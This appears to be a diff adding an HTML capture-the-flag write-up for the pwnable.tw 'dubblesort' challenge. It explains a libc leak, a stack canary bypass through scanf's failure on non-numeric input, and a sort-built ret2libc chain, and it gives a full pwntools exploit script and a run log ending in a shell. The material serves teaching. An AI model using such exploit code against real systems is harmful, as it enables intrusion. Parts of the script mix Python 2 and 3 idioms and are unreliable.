+        <p>The leak includes a leading <code>\x00</code> byte from the stack, so we reconstruct it as <code>u32('\x00' + received_3_bytes) - 0x1b0000</code>.</p>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- CHAPTER 4: EXPLOIT STRATEGY                                  -->
+    <!-- ============================================================ -->
+    <section class="section" id="strategy">
+      <div class="section-header">
+        <div class="section-num">4</div>
+        <h2>Exploit Strategy</h2>
+      </div>
+
+      <h3 id="strategy-leak" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Step 1: Libc Leak via printf</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128272;</span> Exploiting the Missing Null Terminator</div>
+        <ol class="step-list">
+          <li>
+            <span class="step-num">1</span>
+            <div>Send a name of 25 bytes (<code>\x01</code> * 25). This fills the <code>name</code> buffer up to just before a libc address on the stack. The <code>read()</code> syscall does not null-terminate, so <code>printf("%s")</code> reads past the buffer into stack data containing libc pointers.</div>
+          </li>
+          <li>
+            <span class="step-num">2</span>
+            <div>Receive the echoed name + leaked bytes. Parse the 3 bytes after our 25-byte name (the first byte is <code>\x00</code> from the canary's null byte or stack alignment). Reconstruct the libc address and compute the base.</div>
+          </li>
+        </ol>
+        <div class="callout callout-success">
+          <span class="callout-icon">&#9989;</span>
+          <div><strong>Result:</strong> We now know the libc base address, defeating PIE + ASLR. From here we can compute <code>system()</code> and <code>"/bin/sh"</code> addresses.</div>
+        </div>
+      </div>
+
+      <h3 id="strategy-canary" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Step 2: Bypass Canary with scanf Trick</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128170;</span> The scanf Return Value Blind Spot</div>
+        <p>The program calls <code>scanf("%u", &array[idx])</code> in a loop but <strong>never checks the return value</strong>. When <code>scanf</code> encounters a non-numeric character (like <code>"a"</code>), it fails and returns <code>0</code> &mdash; but crucially, it does <strong>not modify the target memory location</strong>. The value at <code>&array[idx]</code> remains unchanged.</p>
+
+        <div class="callout callout-key">
+          <span class="callout-icon">&#128161;</span>
+          <div><strong>Key Insight:</strong> If we time our non-numeric input so that <code>scanf</code> tries to write to the canary's stack position, the canary will be preserved because <code>scanf</code> fails without overwriting it. The loop continues to the next iteration without error.</div>
+        </div>
+
+        <p>With <code>n = 47</code> numbers, the canary sits at index ~13 (after 12 array slots + 1 zero padding). We fill indices 0-11 with zeros, then indices 13+ with <code>system()</code> and <code>/bin/sh</code> addresses. At the canary index, we send <code>"a"</code> to skip it.</p>
+
+        <div class="stack-diagram">
+<div class="stack-row"><span class="stack-addr">index 0-11</span><span class="stack-arrow">&rarr;</span><span class="stack-val">0x00000000</span><span class="stack-desc">; zeros (sort: smaller values first)</span></div>
+<div class="stack-row canary"><span class="stack-addr">index 12</span><span class="stack-arrow">&rarr;</span><span class="stack-val">CANARY</span><span class="stack-desc">; preserved! scanf("a") fails here</span></div>
+<div class="stack-row overflow"><span class="stack-addr">index 13-19</span><span class="stack-arrow">&rarr;</span><span class="stack-val">system()</span><span class="stack-desc">; repeated 7 times</span></div>
+<div class="stack-row ret"><span class="stack-addr">index 20</span><span class="stack-arrow">&rarr;</span><span class="stack-val">"/bin/sh"</span><span class="stack-desc">; pointer to string</span></div>
+        </div>
+      </div>
+
+      <h3 id="strategy-rop" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Step 3: ROP via Sort</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#127922;</span> Bubble Sort as a ROP Constructor</div>
+        <p>After all numbers are read, the program calls <code>sort(array, n)</code> which performs a bubble sort on the unsigned integer array. This means our values will be rearranged in ascending order. We need the canary to survive sorting.</p>
+
+        <div class="callout callout-info">
+          <span class="callout-icon">&#8505;&#65039;</span>
+          <div><strong>Canary survival:</strong> The canary on Linux i386 has its LSB as <code>0x00</code>, making it a small value (e.g., <code>0x5dca2c00</code>). Since we fill earlier indices with <code>0</code> (which is smaller than the canary), the canary will sort to a position right after our zeros. This keeps it in the correct stack position!</div>
+        </div>
+
+        <p>With 12 zeros, the canary value (~<code>0xXXc00</code>) will sort to position 12 (after the 12 zeros), which is exactly where it needs to be. The <code>system()</code> addresses (larger values like <code>0xf7XXXXXX</code>) sort to the end, overwriting saved EBP and the return address. The <code>/bin/sh</code> address (slightly different from <code>system</code>) ends up adjacent.</p>
+
+        <p>The resulting stack after sort:</p>
+        <div class="stack-diagram">
+<div class="stack-row"><span class="stack-addr">positions 0-11</span><span class="stack-arrow">&rarr;</span><span class="stack-val">0x00000000</span><span class="stack-desc">; 12 zeros (sorted first)</span></div>
+<div class="stack-row canary"><span class="stack-addr">position 12</span><span class="stack-arrow">&rarr;</span><span class="stack-val">0xXXca2c00</span><span class="stack-desc">; canary (sorted after zeros)</span></div>
+<div class="stack-row"><span class="stack-addr">position 13</span><span class="stack-arrow">&rarr;</span><span class="stack-val">saved_ebp_val</span><span class="stack-desc">; don't care (gets popped)</span></div>
+<div class="stack-row ret"><span class="stack-addr">position 14+</span><span class="stack-arrow">&rarr;</span><span class="stack-val">system() addr</span><span class="stack-desc">; return address = system!</span></div>
+<div class="stack-row ret"><span class="stack-addr">position 15+</span><span class="stack-arrow">&rarr;</span><span class="stack-val">fake_ret</span><span class="stack-desc">; system's return (don't care)</span></div>
+<div class="stack-row ret"><span class="stack-addr">position 16+</span><span class="stack-arrow">&rarr;</span><span class="stack-val">"/bin/sh" ptr</span><span class="stack-desc">; system()'s argument</span></div>
+        </div>
+
+        <div class="callout callout-success">
+          <span class="callout-icon">&#127881;</span>
+          <div><strong>Final chain:</strong> When <code>main</code> returns, execution jumps to <code>system("/bin/sh")</code>, giving us a shell. The repeated <code>system()</code> values ensure that after sorting, at least one lands on the return address slot, and <code>/bin/sh</code> lands as the first argument.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- CHAPTER 5: PWN SCRIPT                                        -->
+    <!-- ============================================================ -->
+    <section class="section" id="exploit">
+      <div class="section-header">
+        <div class="section-num">5</div>
+        <h2>Pwn Script</h2>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128187;</span> Complete Exploit</div>
+        <pre><code class="language-python">from pwn import *
+
+# Context setup
+context.arch = 'i386'
+context.log_level = 'info'
+
+# Connect to remote
+cn = remote('chall.pwnable.tw', 10101)
+libc = ELF('./libc_32.so.6')
+
+# =============================================
+# STEP 1: Leak libc address
+# =============================================
+# read() doesn't null-terminate, so printf %s
+# leaks stack data past our input (libc addresses)
+cn.recvuntil('name :')
+name = '\x01' * 25  # fill up to libc pointer on stack
+cn.send(name)
+
+cn.recvuntil(name)
+# The byte after our name is \x00 (canary null byte),
+# then 3 bytes of a libc address
+libc.address = u32('\x00' + cn.recv(3)) - 0x1b0000
+
+log.success(f'libc base: {hex(libc.address)}')
+
+# Compute needed addresses
+system = libc.symbols['system']
+binsh  = libc.search('/bin/sh\x00').next()
+
+log.success(f'system:   {hex(system)}')
+log.success(f'/bin/sh:  {hex(binsh)}')
+
+# =============================================
+# STEP 2: Stack overflow + canary bypass
+# =============================================
+cn.recvuntil('sort :')
+n = 47
+cn.sendline(str(n))
+
+# Fill with zeros first (12 values)
+# These sort to the beginning and keep canary in position
+for i in range(12):
+    cn.recv()
+    cn.sendline(str(0))
+
+# Skip the canary index with a non-number
+# scanf("%u") fails -> doesn't overwrite -> canary preserved!
+cn.sendline('a')
+
+# Now write system() and /bin/sh addresses
+# Multiple system() ensures it lands on return address after sort
+for i in range(7):
+    cn.sendline(str(system))
+cn.sendline(str(binsh))
+
+# =============================================
+# STEP 3: Get shell
+# =============================================
+cn.interactive()</code></pre>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128214;</span> Key Functions Reference</div>
+        <table class="info-table">
+          <tr><th>Component</th><th>Purpose</th><th>Detail</th></tr>
+          <tr><td><code>name = '\x01' * 25</code></td><td>Libc leak</td><td>Fills name buffer; printf %s reads past into stack</td></tr>
+          <tr><td><code>u32('\x00' + cn.recv(3))</code></td><td>Address reconstruction</td><td>First leaked byte is 0x00; append 3 more bytes</td></tr>
+          <tr><td><code>n = 47</code></td><td>Overflow size</td><td>Large enough to reach return address</td></tr>
+          <tr><td><code>sendline('a')</code></td><td>Canary bypass</td><td>scanf fails on non-digit; canary untouched</td></tr>
+          <tr><td><code>12 zeros</code></td><td>Sort positioning</td><td>Zeros sort first; canary (small value) stays next</td></tr>
+          <tr><td><code>7 x system()</code></td><td>ROP target</td><td>Multiple copies ensure coverage after sort</td></tr>
+          <tr><td><code>1 x /bin/sh</code></td><td>ROP argument</td><td>Passed as argument to system()</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- CHAPTER 6: EXECUTION RESULTS                                 -->
+    <!-- ============================================================ -->
+    <section class="section" id="results">
+      <div class="section-header">
+        <div class="section-num">6</div>
+        <h2>Execution Results</h2>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span class="icon">&#9654;&#65039;</span> Exploit Run</div>
+        <div class="terminal-output">
+<span class="prompt">$</span> <span class="cmd">python exploit.py</span>
+<span class="output">[*] Opening connection to chall.pwnable.tw on port 10101</span>
+<span class="output">[*] Switching to interactive mode</span>
+<span class="output">[+] libc base: 0xf75a2000</span>
+<span class="output">[+] system:    0xf75e1940</span>
+<span class="output">[+] /bin/sh:   0xf7723688</span>
+<span class="output">What your name :Hello \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01,How many numbers do you what to sort :</span>
+<span class="output">Enter the 1 number : Enter the 2 number : ... Enter the 12 number : </span>
+<span class="output">Enter the 13 number : Enter the 14 number : ... Enter the 20 number : </span>
+<span class="output">After sort :</span>
+<span class="output">0 0 0 0 0 0 0 0 0 0 0 0 265894912 ... 4146571584 4146571584 ...</span>
+<span class="highlight">$</span> <span class="cmd">id</span>
+<span class="flag">uid=1000(dubblesort) gid=1000(dubblesort) groups=1000(dubblesort)</span>
+<span class="highlight">$</span> <span class="cmd">cat /home/dubblesort/flag</span>
+<span class="flag"></span>
+        </div>
+      </div>
+
+      <div class="callout callout-success">
+        <span class="callout-icon">&#127942;</span>
+        <div>
+          <strong>Pwned!</strong> The exploit successfully leaks the libc address, bypasses the canary using the scanf failure trick, overflows the stack with system() and /bin/sh addresses, and the bubble sort arranges them into a valid ROP chain. All protections defeated: Full RELRO (no GOT needed), Canary (scanf bypass), NX (ROP not shellcode), PIE (libc leak), FORTIFY (no fortified function misused).
+        </div>
+      </div>
+
+      <div class="card" style="margin-top:1.5rem;">
+        <div class="card-title"><span class="icon">&#128220;</span> Summary</div>
+        <table class="info-table">
+          <tr><th>Protection</th><th>Status</th><th>Bypass Method</th></tr>
+          <tr><td>Full RELRO</td><td><span class="label green">Enabled</span></td><td>Not needed &mdash; we use ROP, not GOT overwrite</td></tr>
+          <tr><td>Stack Canary</td><td><span class="label yellow">Enabled</span></td><td>scanf("%u") fails on non-digit input; canary preserved</td></tr>
+          <tr><td>NX (DEP)</td><td><span class="label green">Enabled</span></td><td>ROP chain with system("/bin/sh")</td></tr>
+          <tr><td>PIE</td><td><span class="label green">Enabled</span></td><td>Libc leak via read() + printf %s</td></tr>
+          <tr><td>FORTIFY</td><td><span class="label yellow">Enabled</span></td><td>No fortified function exploited; raw read() is not fortified</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer style="margin-top:4rem;padding-top:2rem;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;font-size:0.78rem;color:var(--fg-dim);">
+      <span>&copy; 2024 QA210 &mdash; <a href="https://github.com/Yuri08-QA210" style="color:var(--accent);text-decoration:none;">GitHub</a> |</span>
+      <span>Pwnable.tw dubblesort &bull; 200pts</span>
+    </footer>
+
+  </main>
+</div>
+
+<script>
+// ========== Three.js Particles ==========
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 600;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = [];
+
+  for (let i = 0; i < particleCount; i++) {
+    positions[i * 3]     = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 1] = (Math.random() - 0.5) * 100;
+    positions[i * 3 + 2] = (Math.random() - 0.5) * 100;
+    velocities.push({
+      x: (Math.random() - 0.5) * 0.02,
+      y: (Math.random() - 0.5) * 0.02,
+      z: (Math.random() - 0.5) * 0.02
+    });
+  }
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+
+  const material = new THREE.PointsMaterial({
+    size: 0.4,
+    color: 0x38bdf8,
+    transparent: true,
+    opacity: 0.3,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  function animate() {
+    requestAnimationFrame(animate);
+    const pos = geometry.attributes.position.array;
+    for (let i = 0; i < particleCount; i++) {
+      pos[i * 3]     += velocities[i].x;
+      pos[i * 3 + 1] += velocities[i].y;
+      pos[i * 3 + 2] += velocities[i].z;
+      if (Math.abs(pos[i * 3])     > 50) velocities[i].x *= -1;
+      if (Math.abs(pos[i * 3 + 1]) > 50) velocities[i].y *= -1;
+      if (Math.abs(pos[i * 3 + 2]) > 50) velocities[i].z *= -1;
+    }
+    geometry.attributes.position.needsUpdate = true;
+    points.rotation.y += 0.0003;
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+
+// ========== TOC Active State ==========
+(function() {
+  const sections = document.querySelectorAll('.section');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        const id = entry.target.id;
+        tocLinks.forEach(link => {
+          link.classList.toggle('active', link.getAttribute('data-section') === id);
+        });
+      }
+    });
+  }, { rootMargin: '-80px 0px -60% 0px', threshold: 0 });
+
+  sections.forEach(s => observer.observe(s));
+})();
+
+// ========== Prism Highlight ==========
+document.addEventListener('DOMContentLoaded', () => {
+  Prism.highlightAll();
+});
+</script>
+</body>
+</html>
